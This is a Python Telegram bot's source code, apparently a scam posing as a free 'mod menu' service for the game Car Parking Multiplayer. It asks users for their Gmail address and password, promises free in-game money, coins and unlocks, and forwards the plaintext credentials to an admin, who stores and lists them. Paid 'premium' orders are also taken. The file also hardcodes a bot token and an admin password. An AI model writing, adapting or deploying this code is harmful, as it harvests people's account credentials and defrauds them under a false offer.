from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telegram.request import HTTPXRequest
import asyncio
from datetime import datetime
import json
import os

TOKEN = "8632998397:AAEbV3NQcMyPaK7pwl6ZeQKvCv1l_drkHXo"
ADMIN_ID = 5980762931
ADMIN_PASS = "21210"
DB_FILE = "orders.json"
LOG_FILE = "chatlog.json"

PAGE_SIZE = 10
USER_PAGE_SIZE = 10

ORDERS = {}
ORDER_COUNTER = 1000
CHAT_LOG = {}

def get_display_name(user):
    return f"@{user.username}" if user.username else user.first_name or f"ID:{user.id}"

def load_data():
    global ORDERS, ORDER_COUNTER, CHAT_LOG
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            data = json.load(f)
            ORDERS = {int(k): v for k, v in data.get("orders", {}).items()}
            ORDER_COUNTER = data.get("counter", 1000)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            CHAT_LOG = {int(k): v for k, v in json.load(f).items()}

def save_data():
    with open(DB_FILE, "w") as f:
        json.dump({"orders": ORDERS, "counter": ORDER_COUNTER}, f, indent=2)
    with open(LOG_FILE, "w") as f:
        json.dump(CHAT_LOG, f, indent=2)

async def log_activity(context: ContextTypes.DEFAULT_TYPE, user: Update.effective_user, action: str, data: str = ""):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    name = get_display_name(user)
    entry = f"[{time}] {name} {action} {f'| {data}' if data else ''}"
    if user.id not in CHAT_LOG:
        CHAT_LOG[user.id] = []
    CHAT_LOG[user.id].append(entry)
    CHAT_LOG[user.id] = CHAT_LOG[user.id][-200:]
    save_data()

async def animate_loading(bot, chat_id):
    await bot.send_chat_action(chat_id=chat_id, action="typing")
    msg = await bot.send_message(chat_id, "⏳ Clee Smart bot loading, please wait.")
    await asyncio.sleep(0.2)
    await msg.edit_text("⏳ Clee Smart bot loading, please wait..")
    await asyncio.sleep(0.2)
    await msg.edit_text("⏳ Clee Smart bot loading, please wait...")
    await asyncio.sleep(0.2)
    await msg.delete()
    return

def build_orders_text(orders_dict, start_idx=0, title="ALL ORDERS"):
    if not orders_dict:
        return f"📦 No orders yet."
    sorted_orders = sorted(orders_dict.items(), reverse=True) 
    total = len(sorted_orders)
    end_idx = min(start_idx + PAGE_SIZE, total)
    text = f"📦 **{title}** `{start_idx+1}-{end_idx} of {total}`\n\n"
    for oid, o in sorted_orders[start_idx:end_idx]:
        status_emoji = "✅" if o["status"]=="Completed" else "❌" if o["status"]=="Cancelled" else "⏳"
        # FIXED: Added.get() so old orders dont crash
        username = o.get('username', 'N/A')
        gmail = o.get('gmail', 'N/A')
        password = o.get('password', 'N/A')
        user_id = o.get('user_id', 'N/A')
        text += f"━━━━━━━━━━━━━━\n"
        text += f"🆔 **Order: `#{oid}`**\n"
        text += f"📦 Item: {o['service']} {o['amount']}\n"
        text += f"📊 Status: {o['status']} {status_emoji}\n"
        text += f"👤 User ID: `{user_id}` | {username}\n"
        text += f"📧 Gmail: `{gmail}`\n"
        text += f"🔑 Pass: `{password}`\n"
        text += f"🕒 {o['time']}\n"
    return text

def build_user_orders_text(orders_dict, start_idx=0):
    if not orders_dict:
        return "📦 You have no orders yet."
    sorted_orders = sorted(orders_dict.items(), reverse=True)
    total = len(sorted_orders)
    end_idx = min(start_idx + PAGE_SIZE, total)
    text = f"🛒 **Your Orders** `{start_idx+1}-{end_idx} of {total}`\n\n"
    for oid, o in sorted_orders[start_idx:end_idx]:
        status_emoji = "✅" if o["status"]=="Completed" else "❌" if o["status"]=="Cancelled" else "⏳"
        text += f"`#{oid}` | {o['service']} {o['amount']} | {o['status']} {status_emoji}\n"
        text += f"🕒 `{o['time']}`\n\n"
    return text

def get_pagination_keyboard(data_prefix, start_idx, total):
    buttons = []
    if start_idx > 0:
        buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{data_prefix}_{start_idx - PAGE_SIZE}"))
    if start_idx + PAGE_SIZE < total:
        buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"{data_prefix}_{start_idx + PAGE_SIZE}"))
    back_target = "admin_main" if data_prefix == "admin" else "main"
    buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=back_target))
    return [buttons]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user = update.effective_user
    await log_activity(context, user, "CLICK", "/start")
    if update.message:
        msg = update.message
    elif update.callback_query:
        msg = update.callback_query.message
    else:
        return
    if not context.user_data.get("logged_in"):
        await msg.reply_text("📧 Send your CPM Gmail:")
        context.user_data["state"] = "awaiting_gmail"
        return
    await animate_loading(context.bot, chat_id)
    name = get_display_name(user)
    keyboard = [
        [InlineKeyboardButton("✨ ADD MOD MENU ✨", callback_data="add_mod")],
        [InlineKeyboardButton("💎 PREMIUM MOD MENU 💎", callback_data="premium_mod")],
        [InlineKeyboardButton("📦 MY ORDERS", callback_data="my_orders")],
        [InlineKeyboardButton("🆘 SUPPORT", callback_data="support")],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")]
    ]
    await msg.reply_text(f"Hi, {name}....welcome to Clee Smart CPM 🏠 **Main Menu**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def login_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    user = update.effective_user
    text = update.message.text.strip()
    await log_activity(context, user, "TEXT", text)
    state = context.user_data.get("state")
    if state not in ["awaiting_gmail", "awaiting_password", "awaiting_admin_pass"]:
        if not context.user_data.get("logged_in"):
            await update.message.reply_text("📧 Type /start to begin")
        return
    if state == "awaiting_gmail":
        context.user_data["gmail"] = text
        await update.message.reply_text("🔑 Send your Password:")
        context.user_data["state"] = "awaiting_password"
    elif state == "awaiting_password":
        context.user_data["password"] = text
        context.user_data["logged_in"] = True
        context.user_data["state"] = None
        await start(update, context)
    elif state == "awaiting_admin_pass":
        if text == ADMIN_PASS:
            context.user_data["state"] = None
            await admin_main_menu(update, context)
        else:
            await update.message.reply_text("❌ Wrong password. Try /admincleesmart again.")
            context.user_data["state"] = None

async def add_mod_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "add_mod")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    keyboard = [
        [InlineKeyboardButton("💰 ADD MONEY", callback_data="add_money_menu")],
        [InlineKeyboardButton("🪙 ADD COINS", callback_data="add_coins_menu")],
        [InlineKeyboardButton("🚗 W16 UNLOCK", callback_data="order_free_W16 UNLOCK|Free")],
        [InlineKeyboardButton("🚨 SIREN", callback_data="order_free_SIREN|Free")],
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="order_free_UNLOCK ALL|Free")],
        [InlineKeyboardButton("🏎️ PURCHASE ALL CARS", callback_data="order_free_PURCHASE ALL CARS|Free")],
        [InlineKeyboardButton("👑 KING RANK", callback_data="order_free_KING RANK|Free")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main")]
    ]
    await query.edit_message_text("🎮 **ADD MOD MENU - FREE**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def add_money_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "add_money_menu")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    keyboard = [
        [InlineKeyboardButton("💵 5m", callback_data="order_free_ADD MONEY 5m|Free")],
        [InlineKeyboardButton("💵 10m", callback_data="order_free_ADD MONEY 10m|Free")],
        [InlineKeyboardButton("💵 30m", callback_data="order_free_ADD MONEY 30m|Free")],
        [InlineKeyboardButton("💵 50m", callback_data="order_free_ADD MONEY 50m|Free")],
        [InlineKeyboardButton("⬅️ Back", callback_data="add_mod")]
    ]
    await query.edit_message_text("💰 **ADD MONEY - FREE**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def add_coins_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "add_coins_menu")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    keyboard = [
        [InlineKeyboardButton("🪙 10k", callback_data="order_free_ADD COINS 10k|Free")],
        [InlineKeyboardButton("🪙 30k", callback_data="order_free_ADD COINS 30k|Free")],
        [InlineKeyboardButton("🪙 50k", callback_data="order_free_ADD COINS 50k|Free")],
        [InlineKeyboardButton("🪙 500k", callback_data="order_free_ADD COINS 500k|Free")],
        [InlineKeyboardButton("⬅️ Back", callback_data="add_mod")]
    ]
    await query.edit_message_text("🪙 **ADD COINS - FREE**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def premium_mod_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "premium_mod")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    keyboard = [
        [InlineKeyboardButton("🎨 Premium banner #500", callback_data="order_paid_Premium banner|500")],
        [InlineKeyboardButton("💎 Everything premium #1000", callback_data="order_paid_Everything premium|1000")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main")]
    ]
    await query.edit_message_text("💎 **PREMIUM MOD MENU - PAID**\n[🎨 Premium banner #500]\n[💎 Everything premium #1000]", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def create_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ORDER_COUNTER
    query = update.callback_query
    user = query.from_user
    await log_activity(context, user, "CLICK", query.data)
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)

    data = query.data.replace("order_free_", "").replace("order_paid_", "")
    is_paid = "order_paid_" in query.data

    if "|" in data:
        service, amount = data.split("|")
        amount = f"#{amount}" if amount!= "Free" else "Free"
    else:
        service, amount = data, "Free"

    ORDER_COUNTER += 1
    status = "Pending Payment" if is_paid else "Awaiting Admin Confirmation"

    ORDERS[ORDER_COUNTER] = {
        "user_id": user.id,
        "username": get_display_name(user),
        "gmail": context.user_data.get("gmail", "N/A"),
        "password": context.user_data.get("password", "N/A"),
        "service": service,
        "amount": amount,
        "status": status,
        "is_paid": is_paid,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M")
    }
    save_data()
    o = ORDERS[ORDER_COUNTER]

    if is_paid:
        text = f"📋 **Order Summary**\n🆔 Order ID: `#{ORDER_COUNTER}`\n💵 Service: {service}\n💰 Amount: {amount}\n⏳ Status: {status}\n🕒 Time: `{o['time']}`\n📩 Inbox @Cleesmart for payment"
        keyboard = [[InlineKeyboardButton("✅ I have made payment", callback_data=f"paid_{ORDER_COUNTER}")],
                    [InlineKeyboardButton("⬅️ Back", callback_data="main")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    else:
        status_text = f"""⏳ **Order Status**

🆔 ID: `#{ORDER_COUNTER}`
📦 Service: {o['service']}
💰 Amount: {o['amount']}
📧 Player Gmail: `{o['gmail']}`
📊 Status: {o['status']}
🕒 {o['time']}

✅ Once approved, you will receive an information"""
        await query.edit_message_text(status_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="main")]]), parse_mode="Markdown")

        notif_text = f"{o['username']} {o['user_id']} made payment\n🆔 Order: `#{ORDER_COUNTER}`\n📦 {o['service']} {o['amount']} [FREE]\n📧 `{o['gmail']}`\n🔑 `{o['password']}`"
        keyboard = [[
            InlineKeyboardButton("✅ Accept", callback_data=f"complete_{ORDER_COUNTER}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"cancel_{ORDER_COUNTER}")
        ]]
        await context.bot.send_message(ADMIN_ID, notif_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def payment_done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    await log_activity(context, user, "CLICK", query.data)
    oid = int(query.data.split("_")[1])
    ORDERS[oid]["status"] = "Awaiting Admin Confirmation"
    save_data()
    o = ORDERS[oid]

    status_text = f"""⏳ **Order Status**

🆔 ID: `#{oid}`
📦 Service: {o['service']}
💰 Amount: {o['amount']}
📧 Player Gmail: `{o['gmail']}`
📊 Status: {o['status']}
🕒 {o['time']}

✅ Once approved, you will receive an information"""
    await query.edit_message_text(status_text, parse_mode="Markdown")

    notif_text = f"{o['username']} {o['user_id']} made payment\n🆔 Order: `#{oid}`\n📦 {o['service']} {o['amount']} \n📧 `{o['gmail']}`\n🔑 `{o['password']}`"
    keyboard = [[
        InlineKeyboardButton("✅ Accept", callback_data=f"complete_{oid}"),
        InlineKeyboardButton("❌ Reject", callback_data=f"cancel_{oid}")
    ]]
    await context.bot.send_message(ADMIN_ID, notif_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def my_orders(update: Update, context: ContextTypes.DEFAULT_TYPE, start_idx=0):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "my_orders")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    user_id = query.from_user.id
    user_orders = {oid: o for oid, o in ORDERS.items() if o["user_id"] == user_id}
    total = len(user_orders)
    text = build_user_orders_text(user_orders, start_idx)
    keyboard = get_pagination_keyboard("user", start_idx, total)
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "support")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    text = f"🆘 **Need help?**\n\n📲 Join our WhatsApp channel:\nhttps://whatsapp.com/channel/0029Vakde0KADTOKYapitg32"
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="main")]]), parse_mode="Markdown")

async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "settings")
    await query.answer()
    await animate_loading(context.bot, query.message.chat_id)
    await query.edit_message_text("⚙️ **Manage your account**\n", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Change account", callback_data="change_account")],
        [InlineKeyboardButton("🚪 Log out", callback_data="logout")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main")]
    ]), parse_mode="Markdown")

async def change_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "change_account")
    await query.answer()
    context.user_data["state"] = "awaiting_gmail"
    await query.edit_message_text("📧 Send new CPM Gmail:")

async def logout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await log_activity(context, query.from_user, "CLICK", "logout")
    await query.answer()
    context.user_data.clear()
    await query.edit_message_text("✅ Logged out. Tap /start to log in again.")

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message:
        await update.message.reply_text("🔑 Enter admin password:")
    else:
        await update.callback_query.message.reply_text("🔑 Enter admin password:")
    context.user_data["state"] = "awaiting_admin_pass"

async def userlog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id!= ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: `/userlog USER_ID`", parse_mode="Markdown")
        return
    try:
        uid = int(context.args[0])
        logs = CHAT_LOG.get(uid, [])
        if not logs:
            await update.message.reply_text("📭 No logs for this user.")
            return
        text = f"📜 **Chat Log for `{uid}`**\n\n" + "\n".join(logs[-50:])
        for i in range(0, len(text), 4000):
            await update.message.reply_text(text[i:i+4000])
    except: await update.message.reply_text("❌ Invalid ID")

async def admin_view_log_list(update: Update, context: ContextTypes.DEFAULT_TYPE, start_idx=0):
    query = update.callback_query
    await query.answer()
    all_users = sorted(CHAT_LOG.keys())
    total = len(all_users)
    if total == 0:
        await query.edit_message_text("📭 No users with logs yet.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_main")]]))
        return
    end_idx = min(start_idx + USER_PAGE_SIZE, total)
    keyboard = []
    text = f"📜 **Select a User** `{start_idx+1}-{end_idx} of {total}`\n\n"
    for uid in all_users[start_idx:end_idx]:
        last_entry = CHAT_LOG[uid][-1] if CHAT_LOG[uid] else ""
        name = last_entry.split("]")[1].split("CLICK")[0].split("TEXT")[0].strip() if "]" in last_entry else f"ID:{uid}"
        keyboard.append([InlineKeyboardButton(f"👤 {name} | {uid}", callback_data=f"viewlog_{uid}")])
    nav_buttons = []
    if start_idx > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"userlist_{start_idx - USER_PAGE_SIZE}"))
    if start_idx + USER_PAGE_SIZE < total:
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"userlist_{start_idx + USER_PAGE_SIZE}"))
    nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data="admin_main"))
    keyboard.append(nav_buttons)
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def admin_view_single_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = int(query.data.split("_")[1])
    logs = CHAT_LOG.get(uid, [])
    if not logs:
        await query.answer("📭 No logs for this user.", show_alert=True)
        return
    text = f"📜 **Chat Log for `{uid}`**\n\n" + "\n".join(logs[-50:])
    keyboard = [[InlineKeyboardButton("⬅️ Back to List", callback_data="admin_view_log")]]
    if len(text) > 4000:
        await query.edit_message_text(text[:4000], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        await query.message.reply_text(text[4000:])
    else:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def admin_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id!= ADMIN_ID:
        if update.callback_query:
            await update.callback_query.answer("❌ Admin only", show_alert=True)
            await start(update, context)
        return
    keyboard = [
        [InlineKeyboardButton("📦 ALL ORDERS REQUESTED", callback_data="admin_orders")],
        [InlineKeyboardButton("✅ ORDER CONFIRMATION", callback_data="admin_confirm")],
        [InlineKeyboardButton("📜 VIEW USER LOG", callback_data="admin_view_log")]
    ]
    if update.message:
        await update.message.reply_text("👑 **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.edit_message_text("👑 **Admin Panel**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def admin_orders_requested(update: Update, context: ContextTypes.DEFAULT_TYPE, start_idx=0):
    query = update.callback_query
    await query.answer()
    total = len(ORDERS)
    text = build_orders_text(ORDERS, start_idx, "ALL ORDERS REQUESTED")
    buttons = []
    if start_idx > 0:
        buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_orders_{start_idx - PAGE_SIZE}"))
    if start_idx + PAGE_SIZE < total:
        buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"admin_orders_{start_idx + PAGE_SIZE}"))
    buttons.append(InlineKeyboardButton("⬅️ Back", callback_data="admin_main"))
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([buttons]), parse_mode="Markdown")

async def admin_confirm_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, start_idx=0):
    query = update.callback_query
    await query.answer()
    
    pending_all = {oid: o for oid, o in ORDERS.items() if o["status"] in ["Pending", "Pending Payment", "Awaiting Admin Confirmation"]}
    sorted_pending = sorted(pending_all.items(), reverse=True) 
    total = len(sorted_pending)
    
    if total == 0:
        await query.edit_message_text("✅ **ORDER CONFIRMATION**\n\n📦 No pending orders.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_main")]]), parse_mode="Markdown")
        return

    end_idx = min(start_idx + PAGE_SIZE, total)
    text = f"✅ **ORDER CONFIRMATION** `{start_idx+1}-{end_idx} of {total}`\n\n"
    keyboard = []
    
    for oid, o in sorted_pending[start_idx:end_idx]:
        # FIXED: Added.get() here too
        username = o.get('username', 'N/A')
        gmail = o.get('gmail', 'N/A')
        password = o.get('password', 'N/A')
        user_id = o.get('user_id', 'N/A')
        text += f"━━━━━━━━━━━━━━\n"
        text += f"🆔 **Order: `#{oid}`**\n"
        text += f"📦 Item: {o['service']} {o['amount']}\n"
        text += f"👤 User ID: `{user_id}` | {username}\n"
        text += f"📧 Gmail: `{gmail}`\n"
        text += f"🔑 Pass: `{password}`\n"
        text += f"🕒 {o['time']}\n\n"
        keyboard.append([InlineKeyboardButton(f"✅ Accept #{oid}", callback_data=f"complete_{oid}"), InlineKeyboardButton(f"❌ Reject #{oid}", callback_data=f"cancel_{oid}")])
    
    nav_buttons = []
    if start_idx > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_confirm_{start_idx - PAGE_SIZE}"))
    if start_idx + PAGE_SIZE < total:
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"admin_confirm_{start_idx + PAGE_SIZE}"))
    nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data="admin_main"))
    keyboard.append(nav_buttons)
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def complete_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    oid = int(query.data.split("_")[1])
    ORDERS[oid]["status"] = "Completed"
    save_data()
    o = ORDERS[oid]
    await context.bot.send_message(o["user_id"], f"✅ **Your order has been successfully completed, log in and check order\n🔒 Make sure to change your details after log in**")
    try:
        await query.edit_message_text(f"✅ Accepted\n{o.get('username','N/A')} {o.get('user_id','N/A')}\n🆔 Order: `#{oid}`", parse_mode="Markdown")
    except: pass
    await query.answer(f"✅ `#{oid}` marked Completed", show_alert=True)

async def cancel_order(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    oid = int(query.data.split("_")[1])
    ORDERS[oid]["status"] = "Cancelled"
    save_data()
    o = ORDERS[oid]
    await context.bot.send_message(o["user_id"], f"❌ **Order Cancelled**\n🆔 `#{oid}` | {o['service']} {o['amount']}\n📩 Contact @Cleesmart if this is a mistake.")
    try:
        await query.edit_message_text(f"❌ Rejected\n{o.get('username','N/A')} {o.get('user_id','N/A')}\n🆔 Order: `#{oid}`", parse_mode="Markdown")
    except: pass
    await query.answer(f"❌ `#{oid}` marked Cancelled", show_alert=True)

async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    if data == "main": await start(update, context)
    elif data == "add_mod": await add_mod_menu(update, context)
    elif data == "add_money_menu": await add_money_menu(update, context)
    elif data == "add_coins_menu": await add_coins_menu(update, context)
    elif data == "premium_mod": await premium_mod_menu(update, context)
    elif data == "my_orders": await my_orders(update, context, 0)
    elif data == "support": await support(update, context)
    elif data == "settings": await settings_menu(update, context)
    elif data.startswith("order_free_") or data.startswith("order_paid_"): await create_order(update, context)
    elif data.startswith("paid_"): await payment_done(update, context)
    elif data == "change_account": await change_account(update, context)
    elif data == "logout": await logout(update, context)
    elif data == "admin_main": await admin_main_menu(update, context)
    elif data == "admin_orders": await admin_orders_requested(update, context, 0)
    elif data == "admin_confirm": await admin_confirm_menu(update, context, 0)
    elif data == "admin_view_log": await admin_view_log_list(update, context, 0)
    elif data.startswith("userlist_"):
        idx = int(data.split("_")[1])
        await admin_view_log_list(update, context, idx)
    elif data.startswith("viewlog_"): await admin_view_single_log(update, context)
    elif data.startswith("complete_"): await complete_order(update, context)
    elif data.startswith("cancel_"): await cancel_order(update, context)
    elif data.startswith("user_orders_"):
        idx = int(data.split("_")[2])
        await my_orders(update, context, idx)
    elif data.startswith("admin_orders_"):
        idx = int(data.split("_")[2])
        await admin_orders_requested(update, context, idx)
    elif data.startswith("admin_confirm_"):
        idx = int(data.split("_")[2])
        await admin_confirm_menu(update, context, idx)

def main():
    load_data()
    request = HTTPXRequest(connect_timeout=30, read_timeout=30)
    app = ApplicationBuilder().token(TOKEN).request(request).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admincleesmart", admin))
    app.add_handler(CommandHandler("userlog", userlog))
    app.add_handler(CallbackQueryHandler(button_router))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, login_flow))
    app.add_handler(MessageHandler(filters.COMMAND, start))
    print(f"🚀 Clee Smart bot running ✅")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()